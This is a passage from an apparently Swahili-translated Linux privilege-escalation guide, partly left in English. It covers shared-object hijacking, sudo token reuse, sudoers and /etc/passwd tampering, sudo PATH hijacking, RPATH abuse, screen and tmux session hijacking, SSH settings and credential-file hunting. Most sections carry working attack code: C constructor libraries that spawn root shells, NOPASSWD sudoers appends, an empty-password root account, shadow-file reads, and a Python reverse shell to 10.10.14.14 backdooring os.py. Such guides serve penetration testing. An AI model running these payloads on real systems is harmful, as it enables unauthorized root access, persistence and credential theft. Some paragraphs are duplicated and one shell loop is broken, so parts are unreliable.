Kwa mfano, kukutana na kosa kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ kunapendekeza uwezekano wa exploitation.

Ili exploit hii, mtu angeendelea kwa kuunda faili ya C, sema _"/path/to/.config/libcalc.c"_, ambayo ina code ifuatayo:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Msimbo huu, mara unapokusanywa na kutekelezwa, unalenga kuinua vibali kwa kubadilisha ruhusa za faili na kutekeleza shell yenye vibali vilivyoongezwa.

Kusanya faili ya C hapo juu kuwa shared object (.so) kwa kutumia:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Hatimaye, kuendesha SUID binary iliyoharibika kunapaswa kuchochea exploit, na hivyo kuwezesha kuingiliwa kwa mfumo.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sasa baada ya kupata SUID binary inayopakia library kutoka kwenye folda ambayo tunaweza kuandika, tuunde library hiyo katika folda hiyo kwa jina linalohitajika:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ikiwa unapata hitilafu kama
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
hii ina maana kuwa maktaba uliyotengeneza inahitaji kuwa na function iitwayo `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyochaguliwa ya Unix binaries ambazo mdukuzi anaweza kuzitumia kuvuka vikwazo vya usalama vya ndani. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa lakini kwa kesi ambapo unaweza **kuingiza hoja tu** katika amri.

The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ikiwa unaweza kufikia `sudo -l` unaweza kutumia zana [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) kuangalia ikiwa inapata njia ya kutumia udhaifu wa sheria yoyote ya sudo.

### Kutumia tena Sudo Tokens

Katika matukio ambapo una **sudo access** lakini huna nenosiri, unaweza kuongeza vipaumbele kwa **kusubiri utekelezaji wa amri ya sudo kisha kudukua session token**.

Mahitaji ya kuinua vipaumbele:

- Tayari una shell kama mtumiaji _sampleuser_
- _sampleuser_ ametumia **`sudo`** kutekeleza kitu ndani ya **dakika 15 zilizopita** (kwa kawaida huo ndio muda wa sudo token unaoturuhusu kutumia `sudo` bila kuingiza nenosiri)
- `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
- `gdb` inapatikana (unaweza kuupakia)

(Unaweza kuamsha kwa muda `ptrace_scope` kwa kutumia `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kwa kudumu kwa kubadilisha `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)

Iwapo mahitaji haya yote yatatimizwa, **unaweza kuongeza vipaumbele kwa kutumia:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) itaunda binary `activate_sudo_token` katika _/tmp_. Unaweza kuitumia **kuamsha sudo token kwenye session yako** (hautapata kiotomatiki root shell, tumia `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **exploit ya pili** (`exploit_v2.sh`) itaunda sh shell katika _/tmp_ itakayomilikiwa na root na kuwa na setuid
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- The **third exploit** (`exploit_v3.sh`) itaunda **faili ya sudoers** ambayo inafanya **sudo tokens ziwe za kudumu na kuwaruhusu watumiaji wote kutumia sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ikiwa una **idhini ya kuandika** katika folda au kwenye yoyote ya faili zilizoundwa ndani ya folda unaweza kutumia binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ili **kuunda token ya sudo kwa mtumiaji na PID**.\
Kwa mfano, ikiwa unaweza kuandika upya faili _/var/run/sudo/ts/sampleuser_ na una shell kama mtumiaji huyo na PID 1234, unaweza **kupata ruhusa za sudo** bila kuhitaji kujua nenosiri kwa kufanya:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Faili `/etc/sudoers` na faili zilizo ndani ya `/etc/sudoers.d` zinaamua nani anaweza kutumia `sudo` na jinsi. Faili hizi **kwa chaguo-msingi zinaweza kusomwa tu na user root na group root**.\
**Kama** unaweza **kusoma** faili hii unaweza kuwa na uwezo wa **kupata taarifa za kuvutia**, na ikiwa unaweza **kuandika** faili yoyote utaweza **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ikiwa unaweza kuandika, unaweza kutumia vibaya ruhusa hii
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Njia nyingine ya kutumia vibaya ruhusa hizi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Kuna mbadala kadhaa kwa binary ya `sudo` kama `doas` kwa OpenBSD, kumbuka kuangalia usanidi wake kwenye `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ikiwa unajua kwamba **mtumiaji kwa kawaida huunganishwa kwenye mashine na hutumia `sudo`** kupandisha mamlaka na umepata shell ndani ya muktadha wa mtumiaji huyo, unaweza **kuunda sudo executable mpya** ambayo itatekeleza code yako kama root kisha amri ya mtumiaji. Kisha, **badilisha $PATH** ya muktadha wa mtumiaji (kwa mfano kuongeza path mpya katika .bash_profile) ili mtumiaji anapotekeleza sudo, sudo executable yako itatekelezwa.

Kumbuka kwamba ikiwa mtumiaji anatumia shell tofauti (siyo bash) utahitaji kubadilisha mafaili mengine ili kuongeza path mpya. Kwa mfano [sudo-piggyback](https://github.com/APTy/sudo-piggyback) hubadilisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine katika [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Au kuendesha kitu kama:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Maktaba Iliyoshirikiwa

### ld.so

Faili `/etc/ld.so.conf` inaonyesha **wapi faili za usanidi zinazopakiwa zinatoka**. Kawaida, faili hii ina njia ifuatayo: `include /etc/ld.so.conf.d/*.conf`

Hilo linamaanisha kwamba faili za usanidi kutoka `/etc/ld.so.conf.d/*.conf` zitasomwa. Faili hizi za usanidi **zinaelekeza folda nyingine** ambapo **libraries** zitatafutwa. Kwa mfano, yaliyomo katika `/etc/ld.so.conf.d/libc.conf` ni `/usr/local/lib`. **Hii inamaanisha kwamba mfumo utatafuta libraries ndani ya `/usr/local/lib`**.

Ikiwa kwa sababu fulani **mtumiaji ana ruhusa za kuandika** kwenye yoyote ya njia zilizoonyeshwa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, faili yoyote ndani ya `/etc/ld.so.conf.d/` au folda yoyote iliyotajwa ndani ya faili za usanidi katika `/etc/ld.so.conf.d/*.conf` anaweza kuwa na uwezo wa kupandisha ruhusa.\
Angalia **how to exploit this misconfiguration** kwenye ukurasa ufuatao:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kwa kunakili lib katika `/var/tmp/flag15/`, itatumiwa na programu mahali hapa kama ilivyoainishwa katika kigezo `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Kisha unda maktaba mbaya katika `/var/tmp` kwa kutumia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Uwezo

Linux capabilities hutoa **subset ya root privileges inayopatikana kwa process**. Hii kwa ufanisi inavunja root **privileges kuwa vitengo vidogo na tofauti**. Kila kimoja cha vitengo hivi kinaweza kisha kutolewa kwa processes kwa kujitegemea. Kwa njia hii seti kamili ya privileges inapunguzwa, ikipunguza hatari za exploitation.\
Soma ukurasa ufuatao ili **kujifunza zaidi kuhusu capabilities na jinsi ya kuzitumia vibaya**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Ruhusa za saraka

Katika saraka, **bit ya "execute"** ina maana kwamba mtumiaji aliyohusika anaweza "**cd**" ndani ya folda.\
Bit ya **"read"** inaonyesha mtumiaji anaweza **kuorodhesha** **faili**, na bit ya **"write"** inaonyesha mtumiaji anaweza **kufuta** na **kuunda** faili mpya.

## ACLs

Access Control Lists (ACLs) zinawakilisha tabaka la pili la ruhusa za hiari, zenye uwezo wa **kuvuka the traditional ugo/rwx permissions**. Ruhusa hizi zinaongeza udhibiti juu ya ufikaji wa faili au saraka kwa kuruhusu au kukataa haki kwa watumiaji maalum ambao si wamiliki au sehemu ya kundi. Ngazi hii ya **ubunifu wa undani inahakikisha usimamizi sahihi zaidi wa ufikaji**. Maelezo zaidi yanaweza kupatikana [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Mpa mtumiaji "kali" ruhusa za "read" na "write" juu ya faili:**
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pata** faili zilizo na ACLs maalum kutoka kwenye mfumo:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Backdoor ya ACL iliyofichwa kwenye sudoers drop-ins

Misanidiwi isiyo sahihi inayotokea mara kwa mara ni faili inayomilikiwa na root katika `/etc/sudoers.d/` yenye mode `440` ambayo bado inampa mtumiaji mwenye ruhusa ndogo uwezo wa kuandika kupitia ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Ikiwa unaona kitu kama `user:alice:rw-`, mtumiaji anaweza kuongeza sheria ya sudo licha ya mode bits zenye vizuizi:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Hii ni njia yenye athari kubwa ya ACL persistence/privesc kwa sababu ni rahisi kukosa katika ukaguzi unaotumia `ls -l` pekee.

## Fungua shell sessions

Katika **matoleo ya zamani** unaweza **hijack** baadhi ya **shell** session ya mtumiaji mwingine (**root**).\
Katika **matoleo mapya** utaweza **connect** tu kwenye screen sessions za **mtumiaji wako mwenyewe**. Hata hivyo, unaweza kupata **taarifa za kuvutia ndani ya session**.

### screen sessions hijacking

**Orodhesha screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Unganisha kwenye session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Hii ilikuwa tatizo na **old tmux versions**. Sikuweza hijack session ya tmux (v2.1) iliyoundwa na root kama mtumiaji asiye na ruhusa.

**Orodhesha tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Unganisha kwenye kikao**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Angalia **Valentine box from HTB** kwa mfano.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Vifunguo vyote vya SSL na SSH vilivyotengenezwa kwenye mifumo inayotegemea Debian (Ubuntu, Kubuntu, etc) kati ya Septemba 2006 na Mei 13, 2008 vinaweza kuathiriwa na hitilafu hii.\
Hitilafu hii inasababishwa wakati wa kuunda ssh key mpya katika OS hizo, kwani **only 32,768 variations were possible**. Hii inamaanisha kwamba uwezekano wote unaweza kuhesabiwa na **having the ssh public key you can search for the corresponding private key**. Unaweza kupata possibilities zilizohesabiwa hapa: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Inabainisha kama password authentication inaruhusiwa. Chaguo-msingi ni `no`.
- **PubkeyAuthentication:** Inabainisha kama public key authentication inaruhusiwa. Chaguo-msingi ni `yes`.
- **PermitEmptyPasswords**: Wakati password authentication inaruhusiwa, inabainisha ikiwa server inaruhusu kuingia kwa akaunti zenye mfululizo wa password tupu. Chaguo-msingi ni `no`.

### Login control files

Faili hizi zinaathiri nani anaweza kuingia na jinsi:

- **`/etc/nologin`**: ikiwa ipo, inazuia kuingia kwa watumiaji wasio-root na inaonyesha ujumbe wake.
- **`/etc/securetty`**: inaweka kikomo mahali root anaweza kuingia (TTY allowlist).
- **`/etc/motd`**: post-login banner (can leak environment or maintenance details).

### PermitRootLogin

Inabainisha kama root anaweza kuingia kwa kutumia ssh, chaguo-msingi ni `no`. Thamani zinazowezekana:

- `yes`: root anaweza kuingia kwa kutumia password na private key
- `without-password` or `prohibit-password`: root anaweza kuingia tu kwa private key
- `forced-commands-only`: Root anaweza kuingia kwa private key tu na ikiwa options za amri zimetajwa
- `no` : hapana

### AuthorizedKeysFile

Inabainisha faili zinazoshikilia public keys ambazo zinaweza kutumika kwa user authentication. Inaweza kuwa na tokens kama `%h`, ambazo zitat replaced na home directory. **You can indicate absolute paths** (starting in `/`) or **relative paths from the user's home**. Kwa mfano:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Mpangilio huo utaonyesha kwamba ikiwa utajaribu kuingia kwa kutumia funguo ya **kibinafsi** ya mtumiaji "**testusername**" ssh italinganisha funguo ya **umma** ya funguo yako na zile zilizopo katika `/home/testusername/.ssh/authorized_keys` na `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding inakuwezesha **kutumia SSH keys zako za ndani badala ya kuacha keys** (bila passphrases!) zikiwa kwenye server yako. Hivyo, utaweza **kuruka** kupitia ssh **kwa host** na kutoka huko **kuruka kwa host nyingine** ukitumia **key** iliyoko kwenye **host yako ya mwanzo**.

Unahitaji kuweka chaguo hili katika `$HOME/.ssh.config` kama ifuatavyo:
```
Host example.com
ForwardAgent yes
```
Kumbuka kwamba ikiwa `Host` ni `*` kila mara mtumiaji anapoenda kwenye mashine tofauti, host hiyo itaweza kufikia keys (ambayo ni tatizo la usalama).

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
Faili `/etc/ssh_config` inaweza **kupindua** **chaguzi** hizi na kuruhusu au kukataa usanidi huu.\

The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).\
Faili `/etc/sshd_config` inaweza **kuruhusu** au **kukataa** ssh-agent forwarding kwa kutumia neno muhimu `AllowAgentForwarding` (chaguo-msingi ni kuruhusu).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:\
Ikiwa unagundua kwamba Forward Agent imewekwa katika mazingira, soma ukurasa ufuatao kwani **huenda ukaweza kuitumia kwa uabuse ili kupandisha ruhusa**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profiles files

The file `/etc/profile` and the files under `/etc/profile.d/` are **scripts that are executed when a user runs a new shell**. Therefore, if you can **write or modify any of them you can escalate privileges**.
Faili `/etc/profile` na faili zilizopo chini ya `/etc/profile.d/` ni **scripts zinazotekelezwa wakati mtumiaji anapofungua shell mpya**. Kwa hiyo, ikiwa unaweza **kuandika au kubadilisha yoyote kati yao, unaweza kupandisha ruhusa**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Kama skripti ya profile isiyokuwa ya kawaida inapopatikana unapaswa kuikagua kwa ajili ya **maelezo nyeti**.

### Passwd/Shadow Files

Kulingana na OS, mafaili ya `/etc/passwd` na `/etc/shadow` yanaweza kuwa na jina tofauti au kuna chelezo. Kwa hiyo inashauriwa **kuzipata zote** na **kuangalia kama unaweza kusoma** ili kuona **kama kuna hashes** ndani ya mafaili:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Katika baadhi ya matukio unaweza kupata **password hashes** ndani ya faili ya `/etc/passwd` (au sawa)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Inayoweza kuandikwa /etc/passwd

Kwanza, tengeneza nenosiri kwa kutumia moja ya amri zifuatazo.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Kisha ongeza mtumiaji `hacker` na uweke nenosiri lililotengenezwa.

Nenosiri lililotengenezwa: `Xz7!vQ9%bT3kL2rM`

```bash
sudo useradd -m hacker
echo 'hacker:Xz7!vQ9%bT3kL2rM' | sudo chpasswd
```
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Kwa mfano: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` kwa `hacker:hacker`

Vinginevyo, unaweza kutumia mistari ifuatayo kuongeza mtumiaji wa bandia bila nenosiri.\
ONYO: hii inaweza kudhoofisha usalama wa sasa wa mashine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
Kumbuka: Katika majukwaa ya BSD `/etc/passwd` iko katika `/etc/pwd.db` na `/etc/master.passwd`, pia `/etc/shadow` imebadilishwa jina kuwa `/etc/spwd.db`.

Unapaswa kuangalia kama unaweza **kuandika kwenye baadhi ya faili nyeti**. Kwa mfano, je, unaweza kuandika kwenye baadhi ya **faili za usanidi wa huduma**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Kwa mfano, ikiwa mashine inaendesha **tomcat** server na unaweza **kubadilisha faili ya usanidi ya huduma ya Tomcat ndani ya /etc/systemd/,** basi unaweza kubadilisha mistari:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor yako itatekelezwa mara itakayowashwa tomcat.

### Kagua Mafolda

Mafolda yafuatayo yanaweza kuwa na nakala za akiba au taarifa za kuvutia: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Labda hutaweza kusoma ile ya mwisho lakini jaribu)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Mahali Ajabu/Owned faili
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Faili zilizofanyiwa mabadiliko hivi punde
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Faili za Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml faili
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Mafaili yaliyofichwa
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries katika PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Mafaili ya Web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Chelezo**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Mafaili yanayojulikana yanayoweza kuwa na nywila

Soma msimbo wa [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), inatafuta **mafayela kadhaa yanayowezekana ambayo yanaweza kuwa na nywila**.\
**Zana nyingine ya kuvutia** ambayo unaweza kutumia ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) ambayo ni programu ya chanzo wazi inayotumika kupata nywila nyingi zilizo hifadhiwa kwenye kompyuta ya ndani kwa Windows, Linux & Mac.

### Logs

Ikiwa unaweza kusoma logs, unaweza kupata **taarifa za kuvutia/zinazo karibu kuwa siri ndani yao**. Kadri log inavyokuwa ya ajabu zaidi, ndivyo inavyoweza kuwa ya kuvutia zaidi (labda).\
Pia, baadhi ya **mbaya** configured (backdoored?) **audit logs** zinaweza kukuruhusu **kurekodi nywila** ndani ya audit logs kama ilivyoelezwa katika chapisho hiki: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Ili **read logs the group** [**adm**](interesting-groups-linux-pe/index.html#adm-group) itakuwa ya msaada sana.

### Faili za Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Unapaswa pia kuangalia faili zenye neno "**password**" katika **jina** au ndani ya **yaliyomo**, pamoja na kuangalia IPs na emails ndani ya logs, au hashes regexps.\
Sitaelezea hapa jinsi ya kufanya haya yote lakini ikiwa una nia unaweza kuangalia ukaguzi wa mwisho unaofanywa na [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Faili zinazoweza kuandikwa

### Python library hijacking

Iwapo unajua **kutoka wapi** script ya python itaendeshwa na unaweza **kuandika ndani** ya folda hiyo au unaweza **kuhariri python libraries**, unaweza kubadilisha OS library na kuiweka backdoor (ikiwa unaweza kuandika mahali script ya python itaendeshwa, nakili na ubandike os.py library).

Ili **backdoor the library**, ongeza tu mwishoni mwa os.py library mstari ufuatao (badilisha IP na PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Utekelezaji wa logrotate

Udhaifu katika `logrotate` unamruhusu mtumiaji aliye na **write permissions** kwenye faili ya logi au saraka zake za mzazi kupata kwa uwezekano ruhusa zilizopandishwa. Hii ni kwa sababu `logrotate`, mara nyingi ikiendesha kama **root**, inaweza kudhibitiwa ili kutekeleza faili yoyote ile, hasa katika saraka kama _**/etc/bash_completion.d/**_. Ni muhimu kukagua ruhusa si tu katika _/var/log_ bali pia katika saraka yoyote ambapo log rotation inafanyika.

> [!TIP]
> Udhaifu huu unaathiri `logrotate` version `3.18.0` na zile za zamani

Maelezo zaidi kuhusu udhaifu yanaweza kupatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Unaweza kutumia udhaifu huu kwa kutumia [**logrotten**](https://github.com/whotwagner/logrotten).

Udhaifu huu ni sawa sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** hivyo kila unapogundua kuwa unaweza kubadilisha logi, angalia nani anasimamia logi hizo na kama unaweza kuongeza ruhusa kwa kubadilisha logi kuwa symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ikiwa, kwa sababu yoyote, mtumiaji anaweza **write** script ya `ifcf-<whatever>` kwenye _/etc/sysconfig/network-scripts_ **au** anaweza **adjust** ile iliyopo, basi **system yako imepwned**.

Network scripts, _ifcg-eth0_ kwa mfano hutumika kwa muunganisho wa mtandao. Zinaonekana kabisa kama faili .INI. Hata hivyo, zinas \~sourced\~ kwenye Linux na Network Manager (dispatcher.d).

Katika kesi yangu, `NAME=` iliyowekwa katika network scripts hizi haitendewi ipasavyo. Ikiwa una **nafasi tupu/blank katika jina mfumo unajaribu kutekeleza sehemu inayofuata baada ya nafasi hiyo**. Hii inamaanisha kwamba **kila kitu kilicho baada ya nafasi ya kwanza kinatekelezwa kama root**.

Kwa mfano: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Kumbuka nafasi tupu kati ya Network na /bin/id_)

### **init, init.d, systemd, and rc.d**

Katalogi `/etc/init.d` ni nyumbani kwa **scripts** za System V init (SysVinit), **classic Linux service management system**. Inajumuisha scripts za `start`, `stop`, `restart`, na wakati mwingine `reload` huduma. Hizi zinaweza kutekelezwa moja kwa moja au kupitia symbolic links zinazopatikana katika `/etc/rc?.d/`. Njia mbadala kwenye mifumo ya Redhat ni `/etc/rc.d/init.d`.

